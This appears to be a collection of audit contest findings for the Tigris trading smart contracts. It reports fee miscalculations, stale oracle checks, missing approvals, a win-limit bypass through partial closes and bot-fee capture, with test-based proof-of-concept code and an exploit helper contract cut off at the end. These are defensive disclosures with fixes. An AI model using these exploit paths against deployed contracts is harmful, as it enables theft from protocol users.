See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Deekshith99-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Deivitto-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L275-L282   # Vulnerability details  ## Impact When adding to a position, the amount of margin pulled from the user is not as much as it should be, which leaks value from the protocol and lowering the collateralization ratio of `tigAsset`.  ## Proof of Concept In `Trading.addToPosition` the `_handleDeposit` function is called like this:  ```js _handleDeposit(     _trade.tigAsset,     _marginAsset,     _addMargin - _fee,     _stableVault,     _permitData,     _trader ); ```  The third parameter with the value of `_addMargin - _fee` is the amount pulled (or burned in the case of using `tigAsset`) from the user. The `_fee` value is calculated as part of the position size like this:   ```js uint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false); ```  The `_handleOpenFees` function mints `_tigAsset` to the referrer, to the `msg.sender` (if called by a function meant to be executed by bots) and to the protocol itself. Those minted tokens are supposed to be part of the `_addMargin` value paid by the user. Hence using `_addMargin - _fee` as the third parameter to `_handleDeposit` is going to pull or burn less margin than what was accounted for.  An example for correct usage can be seen in `initiateMarketOrder`:  ```js uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false); uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18; _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader); ```  Here the third parameter to `_handleDeposit` is not `_marginAfterFees` but `_tradeInfo.margin` which is what the user has input and is supposed to pay.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  In `Trading.addToPosition` call the `_handleDeposit` function without subtracting the `_fee` value:  ```js _handleDeposit(     _trade.tigAsset,     _marginAsset,     _addMargin,     _stableVault,     _permitData,     _trader ); ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/rbserver-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/brgltd-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122   # Vulnerability details  ## Impact As mentioned by https://docs.tigris.trade/protocol/oracle, "Prices provided by the oracle network are also compared to Chainlink's public price feeds for additional security. If prices have more than a 2% difference the transaction is reverted." The Chainlink price verification logic in the following `TradingLibrary.verifyPrice` function serves this purpose. However, besides that `IPrice(_chainlinkFeed).latestAnswer()` uses Chainlink's deprecated `latestAnswer` function, this function also does not guarantee that the price returned by the Chainlink price feed is not stale. When `assetChainlinkPriceInt != 0` is `true`, it is still possible that `assetChainlinkPriceInt` is stale in which the Chainlink price verification would compare the off-chain price against a stale price returned by the Chainlink price feed. For a off-chain price that has more than a 2% difference when comparing to a more current price returned by the Chainlink price feed, this off-chain price can be incorrectly considered to have less than a 2% difference when comparing to a stale price returned by the Chainlink price feed. As a result, a trading transaction that should revert can go through, which makes the price verification much less secure.  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L91-L122 ```solidity     function verifyPrice(         uint256 _validSignatureTimer,         uint256 _asset,         bool _chainlinkEnabled,         address _chainlinkFeed,         PriceData calldata _priceData,         bytes calldata _signature,         mapping(address => bool) storage _isNode     )         external view     {         ...         if (_chainlinkEnabled && _chainlinkFeed != address(0)) {             int256 assetChainlinkPriceInt = IPrice(_chainlinkFeed).latestAnswer();             if (assetChainlinkPriceInt != 0) {                 uint256 assetChainlinkPrice = uint256(assetChainlinkPriceInt) * 10**(18 - IPrice(_chainlinkFeed).decimals());                 require(                     _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&                     _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, "!chainlinkPrice"                 );             }         }     } ```  Based on https://docs.chain.link/docs/historical-price-data, the followings can be done to avoid using a stale price returned by the Chainlink price feed. 1. The `latestRoundData` function can be used instead of the deprecated `latestAnswer` function. 2. `roundId` and `answeredInRound` are also returned. "You can check `answeredInRound` against the current `roundId`. If `answeredInRound` is less than `roundId`, the answer is being carried over. If `answeredInRound` is equal to `roundId`, then the answer is fresh." 3. "A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0."  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice calls the `Trading.initiateMarketOrder` function, which eventually calls the `TradingLibrary.verifyPrice` function, to initiate a market order. 2. When the `TradingLibrary.verifyPrice` function is called, the off-chain price is compared to the price returned by the Chainlink price feed for the position asset. 3. The price returned by the Chainlink price feed is stale, and the off-chain price has less than a 2% difference when comparing to this stale price. 4. Alice's `Trading.initiateMarketOrder` transaction goes through. However, this transaction should revert because the off-chain price has more than a 2% difference if comparing to a more current price returned by the Chainlink price feed.  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/TradingLibrary.sol#L113 can be updated to the following code. ```solidity             (uint80 roundId, int256 assetChainlinkPriceInt, , uint256 updatedAt, uint80 answeredInRound) = IPrice(_chainlinkFeed).latestRoundData();             require(answeredInRound >= roundId, "price is stale");             require(updatedAt > 0, "round is incomplete"); ```
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750 https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810 https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294   # Vulnerability details  ## Impact Calling the following `Trading._handleOpenFees` function does not approve the `GovNFT` contract for spending any of the `Trading` contract's `_tigAsset` balance, which is unlike calling the `Trading._handleCloseFees` function below that executes `IStable(_tigAsset).approve(address(gov), type(uint).max)`. Due to this lack of approval, when calling the `Trading._handleOpenFees` function without the `Trading._handleCloseFees` function being called for the same `_tigAsset` beforehand, the `GovNFT.distribute` function's execution of `IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount)` in the `try...catch...` block will not transfer any `_tigAsset` amount as the trade's DAO fees to the `GovNFT` contract. In this case, although the Governance NFT holder, whose NFT was minted before the `Trading._handleOpenFees` function is called, deserves the rewards from the DAO fees generated by the trade, this holder does not have any pending rewards after such `Trading._handleOpenFees` function call because none of the DAO fees were transferred to the `GovNFT` contract. Hence, this Governance NFT holder loses the rewards that she or he is entitled to.  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L689-L750 ```solidity     function _handleOpenFees(         uint _asset,         uint _positionSize,         address _trader,         address _tigAsset,         bool _isBot     )         internal         returns (uint _feePaid)     {         ...         unchecked {             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;             ...             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);         }         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));     } ```  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L762-L810 ```solidity     function _handleCloseFees(         uint _asset,         uint _payout,         address _tigAsset,         uint _positionSize,         address _trader,         bool _isBot     )         internal         returns (uint payout_)     {         ...         IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);         IStable(_tigAsset).approve(address(gov), type(uint).max);         gov.distribute(_tigAsset, _daoFeesPaid);         return payout_;     } ```  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L287-L294 ```solidity     function distribute(address _tigAsset, uint _amount) external {         if (assets.length == 0 || assets[assetsIndex[_tigAsset]] == address(0) || totalSupply() == 0 || !_allowedAsset[_tigAsset]) return;         try IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount) {             accRewardsPerNFT[_tigAsset] += _amount/totalSupply();         } catch {             return;         }     } ```  ## Proof of Concept Functions like `Trading.initiateMarketOrder` further call the `Trading._handleOpenFees` function so this POC uses the `Trading.initiateMarketOrder` function.  Please add the following test in the `Signature verification` `describe` block in `test\07.Trading.js`. This test will pass to demonstrate the described scenario. Please see the comments in this test for more details. ```typescript     it.only("Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called, can lose deserved rewards after initiateMarketOrder function is called", async function () {       let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("30000"), parseEther("10000"), ethers.constants.HashZero];       let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 0, parseEther("20000"), 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        // one Governance NFT is minted to owner before initiateMarketOrder function is called       const GovNFT = await deployments.get("GovNFT");       const govnft = await ethers.getContractAt("GovNFT", GovNFT.address);       await govnft.connect(owner).mint();        // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract       await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))         .to.emit(trading, 'FeesDistributed')         .withArgs(stabletoken.address, "10000000000000000000", "0", "0", "0", ethers.constants.AddressZero);        // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called       await govnft.connect(owner).mint();       await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);        // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called       expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal("0");        // owner's Governance NFT was minted before initiateMarketOrder function was called so her or his pending reward amount should be 10000000000000000000.       // However, owner's pending reward amount is still 0 because DAO fees were not transferred to GovNFT contract successfully.       expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal("0");     }); ```  Furthermore, as a suggested mitigation, please add `IStable(_tigAsset).approve(address(gov), type(uint).max);` in the `_handleOpenFees` function as follows in line 749 of `contracts\Trading.sol`. ```solidity 689:     function _handleOpenFees( 690:         uint _asset, 691:         uint _positionSize, 692:         address _trader, 693:         address _tigAsset, 694:         bool _isBot 695:     ) 696:         internal 697:         returns (uint _feePaid) 698:     { 699:         IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset); ... 732:         unchecked { 733:             uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT; 734:             _feePaid = 735:                 _positionSize 736:                 * (_fees.burnFees + _fees.botFees) // get total fee% 737:                 / DIVISION_CONSTANT // divide by 100% 738:                 + _daoFeesPaid; 739:             emit FeesDistributed( 740:                 _tigAsset, 741:                 _daoFeesPaid, 742:                 _positionSize * _fees.burnFees / DIVISION_CONSTANT, 743:                 _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0, 744:                 _positionSize * _fees.botFees / DIVISION_CONSTANT, 745:                 _referrer 746:             ); 747:             IStable(_tigAsset).mintFor(address(this), _daoFeesPaid); 748:         } 749:         IStable(_tigAsset).approve(address(gov), type(uint).max);   // @audit add this line of code for POC purpose 750:         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this))); 751:     } ```  Then, as a comparison, the following test can be added in the `Signature verification` `describe` block in `test\07.Trading.js`. This test will pass to demonstrate that the Governance NFT holder's pending rewards is no longer 0 after implementing the suggested mitigation. Please see the comments in this test for more details. ```typescript     it.only(`If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called,              can receive deserved rewards after initiateMarketOrder function is called`, async function () {       let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("30000"), parseEther("10000"), ethers.constants.HashZero];       let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 0, parseEther("20000"), 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        // one Governance NFT is minted to owner before initiateMarketOrder function is called       const GovNFT = await deployments.get("GovNFT");       const govnft = await ethers.getContractAt("GovNFT", GovNFT.address);       await govnft.connect(owner).mint();        // calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract       await expect(trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address))         .to.emit(trading, 'FeesDistributed')         .withArgs(stabletoken.address, "10000000000000000000", "0", "0", "0", ethers.constants.AddressZero);        // another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called       await govnft.connect(owner).mint();       await govnft.connect(owner).transferFrom(owner.getAddress(), user.getAddress(), 1);        // user's pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called       expect(await govnft.pending(user.getAddress(), stabletoken.address)).to.equal("0");        // If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, owner's pending reward amount should be 10000000000000000000       //   because her or his Governance NFT was minted before initiateMarketOrder function was called.       expect(await govnft.pending(owner.getAddress(), stabletoken.address)).to.equal("10000000000000000000");     }); ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L749 can be updated to the following code. ```solidity         IStable(_tigAsset).approve(address(gov), type(uint).max);         gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this))); ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/JC-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/c3phas-G.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L513-L517   # Vulnerability details   The `PairsContract` registeres the total long/short position that's open for a pair of assets, whenever a new position is created the total grows accordingly. However at `executeLimitOrder()` the position size that's added is wrongly calculated - it uses margin before fees, while the actual position is created after subtracting fees.  ## Impact The OpenInterest would register wrong values (11% diff in the case of PoC), which will distort the balance between long and short positions (the whole point of the OpenInterest is to balance them to be about equal).   ## Proof of Concept In the following test, an order is created with a x100 leverage, and the position size registered for OI is 11% greater than the actual position created.   ```diff diff --git a/test/07.Trading.js b/test/07.Trading.js index ebe9948..dfb7f98 100644 --- a/test/07.Trading.js +++ b/test/07.Trading.js @@ -778,7 +778,7 @@ describe("Trading", function () {       */      it("Creating and executing limit buy order, should have correct price and bot fees", async function () {        // Create limit order -      let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero]; +      let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("100"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        await trading.connect(owner).initiateLimitOrder(TradeInfo, 1, parseEther("20000"), PermitData, owner.address);        expect(await position.limitOrdersLength(0)).to.equal(1); // Limit order opened @@ -787,6 +787,9 @@ describe("Trading", function () {        await network.provider.send("evm_increaseTime", [10]);        await network.provider.send("evm_mine");   +      let count = await position.getCount(); +      let id = count.toNumber() - 1; +        // Execute limit order        let PriceData = [node.address, 0, parseEther("10000"), 10000000, 2000000000, false]; // 0.1% spread        let message = ethers.utils.keccak256( @@ -798,8 +801,22 @@ describe("Trading", function () {        let sig = await node.signMessage(          Buffer.from(message.substring(2), 'hex')        ); +      // trading.connect(owner).setFees(true,3e8,1e8,1e8,1e8,1e8);         -      await trading.connect(user).executeLimitOrder(1, PriceData, sig); + +      let oi = await pairscontract.idToOi(0, stabletoken.address); +      expect(oi.longOi.toNumber()).to.equal(0); +      console.log({oi, stable:stabletoken.address}); + +      await trading.connect(user).executeLimitOrder(id, PriceData, sig); +      let trade = await position.trades(id); +      console.log(trade); +      oi = await pairscontract.idToOi(0, stabletoken.address); +      console.log(oi); + +      expect(oi.longOi.div(10n**18n).toNumber()).to.equal(trade.margin.mul(trade.leverage).div(10n**18n * 10n**18n).toNumber()); + +        expect(await position.limitOrdersLength(0)).to.equal(0); // Limit order executed        expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Creates open position        expect((await trading.openFees()).botFees).to.equal(2000000); @@ -807,6 +824,7 @@ describe("Trading", function () {        let [,,,,price,,,,,,,] = await position.trades(1);        expect(price).to.equal(parseEther("20020")); // Should have guaranteed execution price with spread      }); +    return;      it("Creating and executing limit sell order, should have correct price and bot fees", async function () {        // Create limit order        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, false, parseEther("0"), parseEther("0"), ethers.constants.HashZero]; @@ -1606,6 +1624,7 @@ describe("Trading", function () {        expect(await stabletoken.balanceOf(user.address)).to.equal(parseEther("1.5"));      });    }); +  return;    describe("Modifying functions", function () {      it("Updating TP/SL on a limit order should revert", async function () {        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];  ```  Output: ``` 1) Trading        Limit orders and liquidations          Creating and executing limit buy order, should have correct price and bot fees:        AssertionError: expected 100000 to equal 90000       + expected - actual        -100000       +90000 ```   ## Recommended Mitigation Steps Correct the calculation to use margin after fees.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/0xNazgul-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Aymen0909-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/Aymen0909-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178-L179 https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738   # Vulnerability details  ## Description When ```initiateMarketOrder``` is called, ```_marginAfterFees``` are calculated and then use it to calculate ```_positionSize```  ```solidity uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false); uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18; ```  The problem is that ```_handleOpenFees``` does not consider referrer fees when it calculates its output (paidFees), leading to open a position greater than expected.  ## Impact For a referred trade, ```initiateMarketOrder``` always opens a position greater than the one supposed, by allowing to use more margin than the one expected.   ## POC The output of ```_handleOpenFees``` is ```_feePaid```, which is calculated [once](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734-L738), and it does not consider referralFees  ```solidity // No refferal fees are considered _feePaid =     _positionSize     * (_fees.burnFees + _fees.botFees) // get total fee%     / DIVISION_CONSTANT // divide by 100%     + _daoFeesPaid; ```  Then we can notice that, if the output of ```_handleOpenFees``` did not consider referral fees, neither would _marginAfterFees do  ```solidity uint256 _marginAfterFees =     _tradeInfo.margin-     _handleOpenFees(         _tradeInfo.asset,         _tradeInfo.margin*_tradeInfo.leverage/1e18,          _trader,         _tigAsset,         false);  // @audit Then _positionSize would be greater than what is supposed to be, allowing to create a position greater than expected uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18; ```  ## Mitigation steps Consider referral fees when ```_feePaid``` is calculated in ```_handleOpenFees```  ```diff // In _handleOpenFees function +   uint256 _refFeesToConsider = _referrer == address(0) ? 0 : _fees.referralFees;     _feePaid =         _positionSize -       * (_fees.burnFees + _fees.botFees) // get total fee% +       * (_fees.burnFees + _fees.botFees + _refFeesToConsider) // get total fee%         / DIVISION_CONSTANT // divide by 100%         + _daoFeesPaid; ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/joestakey-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/hansfriese-Q.md).
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/b2ebb8ea1def4927a747e7a185174892506540ab/contracts/Trading.sol#L506   # Vulnerability details  ## Impact The open price of a stop order might be changed during execution but it doesn't validate StopLoss/TakeProfit for the changed price.  As a result, the executed market order might be closed immediately and there would be an unexpected loss for users.  ## Proof of Concept As we can see from `executeLimitOrder()`, the open price might be changed to the current price for the stop order.  ```solidity File: 2022-12-tigris\contracts\Trading.sol 480:     function executeLimitOrder( 481:         uint _id,  482:         PriceData calldata _priceData, 483:         bytes calldata _signature 484:     )  485:         external 486:     { 487:         unchecked { 488:             _checkDelay(_id, true); 489:             tradingExtension._checkGas(); 490:             if (tradingExtension.paused()) revert TradingPaused(); 491:             require(block.timestamp >= limitDelay[_id]); 492:             IPosition.Trade memory trade = position.trades(_id); 493:             uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true); 494:             (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0); 495:             if (trade.orderType == 0) revert("5"); 496:             if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert("6"); //LimitNotMet 497:             if (trade.direction && trade.orderType == 1) { 498:                 if (trade.price < _price) revert("6"); //LimitNotMet 499:             } else if (!trade.direction && trade.orderType == 1) { 500:                 if (trade.price > _price) revert("6"); //LimitNotMet 501:             } else if (!trade.direction && trade.orderType == 2) { 502:                 if (trade.price < _price) revert("6"); //LimitNotMet 503:                 trade.price = _price; 504:             } else { 505:                 if (trade.price > _price) revert("6"); //LimitNotMet 506:                 trade.price = _price; //@audit check sl/tp 507:             }  508:             if(trade.direction) { 509:                 trade.price += trade.price * _spread / DIVISION_CONSTANT; 510:             } else { 511:                 trade.price -= trade.price * _spread / DIVISION_CONSTANT; 512:             }  ```  But it doesn't validate sl/tp again for the new price so the order might have an invalid sl/tp.  The new price wouldn't satisfy the sl/tp requirements when the price was changed much from the original price due to the high slippage and the order might be closed immediately by sl or tp in this case.  Originally, the protocol validates stoploss only but I say to validate both of stoploss and takeprofit. (I submitted it as another issue to validate tp as well as sl).  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend validating sl/tp for the new `trade.price` in `Trading.executeLimitOrder()`.
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/b2ebb8ea1def4927a747e7a185174892506540ab/contracts/Trading.sol#L625-L627   # Vulnerability details  ## Impact Users can bypass the `maxWinPercent` limit using a partial closing.  As a result, users can receive more funds than their upper limit from the protocol.  ## Proof of Concept As we can see from the [documentation](https://docs.tigris.trade/protocol/trading-and-fees#limitations), there is limitation of a maximum PnL.  ``` Maximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually. ```  And this logic was implemented like below in `_closePosition()`.  ```solidity File: 2022-12-tigris\contracts\Trading.sol 624:                 _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot); 625:                 if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) { //@audit bypass limit 626:                     _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT; 627:                 } ```  But it checks the `maxWinPercent` between the partial payout and full margin so the below scenario is possible.  1. Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees. 2. If `maxWinPercent` = 500%, Alice should receive 500 at most. 3. But Alice closed 50% of the position and she got 500 for a 50% margin because it checks `maxWinPercent` with `_toMint = 500` and `_trade.margin = 100` 4. After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again. 5. As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.  ## Tools Used Manual Review  ## Recommended Mitigation Steps We should check the `maxWinPercent` between the partial payout and partial margin like below.  ```solidity     _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);      uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT; //+++++++++++++++++++++++     if (maxWinPercent > 0 && _toMint > partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) {          _toMint = partialMarginToClose*maxWinPercent/DIVISION_CONSTANT;     } ```
# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L565-L576   # Vulnerability details    ## Impact Bot fees are used when a position is opened/closed via a bot. In that case a bot fee is subtracted from the dao fee and sent to the closing bot. A user can use that to to reduce the dao fees for closing an order and keep it to themselves. Instead of closing the order via `initiateClose()`, the user can use a proxy contract to update the stop-loss value and then `limitClose()` the order. Since that is done in one function call, no bot can run the `limitClose()` and the bot fee will go to the user.  ## Proof of Concept  The following PoC shows how a trade is closed by a proxy contract that sets the limit and closes it via `limitClose()`:  ```diff diff --git a/test/07.Trading.js b/test/07.Trading.js index ebe9948..e50b0cc 100644 --- a/test/07.Trading.js +++ b/test/07.Trading.js @@ -17,6 +17,7 @@ describe("Trading", function () {      let TradingExtension;    let tradingExtension; +  let myTrader;      let TradingLibrary;    let tradinglibrary; @@ -37,7 +38,7 @@ describe("Trading", function () {      let MockDAI;    let MockUSDC; -  let mockusdc; +  let mockusdc, mockdai;      let badstablevault;   @@ -55,6 +56,7 @@ describe("Trading", function () {      const Position = await deployments.get("Position");      position = await ethers.getContractAt("Position", Position.address);      MockDAI = await deployments.get("MockDAI"); +    mockdai = await ethers.getContractAt("MockERC20", MockDAI.address);      MockUSDC = await deployments.get("MockUSDC");      mockusdc = await ethers.getContractAt("MockERC20", MockUSDC.address);      const PairsContract = await deployments.get("PairsContract"); @@ -84,6 +86,10 @@ describe("Trading", function () {      TradingLibrary = await deployments.get("TradingLibrary");      tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);      await trading.connect(owner).setLimitOrderPriceRange(1e10); + + +    let mtFactory = await ethers.getContractFactory("MyTrader"); +    myTrader = await mtFactory.deploy(Trading.address, Position.address);    });    describe("Check onlyOwner and onlyProtocol", function () {      it("Set max win percent", async function () { @@ -536,6 +542,31 @@ describe("Trading", function () {        expect(await position.assetOpenPositionsLength(0)).to.equal(1); // Trade has opened        expect(await stabletoken.balanceOf(owner.address)).to.equal(parseEther("0")); // Should no tigAsset left      }); + +    it("Test my trader", async function () { +      let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero]; +      let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false]; +      let message = ethers.utils.keccak256( +        ethers.utils.defaultAbiCoder.encode( +          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'], +          [node.address, 0, parseEther("20000"), 0, 2000000000, false] +        ) +      ); +      let sig = await node.signMessage( +        Buffer.from(message.substring(2), 'hex') +      ); +       +      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true]; +      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address); + + +      await trading.connect(owner).approveProxy(myTrader.address, 1e10); +      await myTrader.connect(owner).closeTrade(1, PriceData, sig); + + +    }); +  return; +      it("Closing over 100% should revert", async function () {        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];        let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false]; @@ -551,8 +582,10 @@ describe("Trading", function () {                let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address); +        await expect(trading.connect(owner).initiateCloseOrder(1, 1e10+1, PriceData, sig, StableVault.address, StableToken.address, owner.address)).to.be.revertedWith("BadClosePercent");      }); +    return;      it("Closing 0% should revert", async function () {        let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 0, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];        let PriceData = [node.address, 0, parseEther("20000"), 0, 2000000000, false]; @@ -700,6 +733,7 @@ describe("Trading", function () {        expect(margin).to.equal(parseEther("500"));      });    }); +  return;    describe("Trading using <18 decimal token", async function () {      it("Opening and closing a position with tigUSD output", async function () {        await pairscontract.connect(owner).setAssetBaseFundingRate(0, 0); // Funding rate messes with results because of time  ```  `MyTrader.sol`: ```solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.0;  import {ITrading} from "../interfaces/ITrading.sol"; import "../utils/TradingLibrary.sol"; import "../interfaces/IPosition.sol"; import {ERC20} from "@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol";     contract MyTrader{      ITrading trading;     IPosition position;      receive() payable external{      }      constructor(address _trading, address _position){         trading = ITrading(_trading);         position = IPosition(_position);     }      function closeTrade(         uint _id,         PriceData calldata _priceData,         bytes calldata _signature     ) public{         bool _tp = false;                  trading.updateTpSl(_tp, _id, _priceData.price, _priceData, _signature, msg.sender);         trading.limitClose(_id, _tp, _priceData, _signature);               